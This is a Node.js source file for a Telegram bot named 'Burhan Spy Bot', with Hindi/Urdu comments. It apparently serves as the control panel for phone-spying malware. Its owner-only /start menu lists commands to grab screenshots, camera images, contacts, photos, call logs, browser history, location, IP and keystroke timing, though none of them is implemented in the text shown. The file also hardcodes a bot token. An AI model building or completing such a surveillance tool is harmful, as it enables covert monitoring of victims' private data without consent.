const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

// Hamesha online rakhne ke liye Health Check endpoint
app.get('/', (req, res) => {
    res.status(200).json({ status: 'ok' });
});

// Bot ko commands sunna hai
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/snapshot - Screen Shot\n/front_cam - Front Camera\n/back_cam - Back Camera\n/contacts - Contacts\n/photos - Photos and Videos\n/call_logs - Call Logs\n/browser_history - Browser History\n/battery - Battery %\n/location - Location\n/ip - Original IP\n/status - Online/Offline Status\n/key_time - Key Time Status`);
});

// Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

// Express server start karo
app.listen(3000, () => {
    console.log("Server running on port 3000");
});
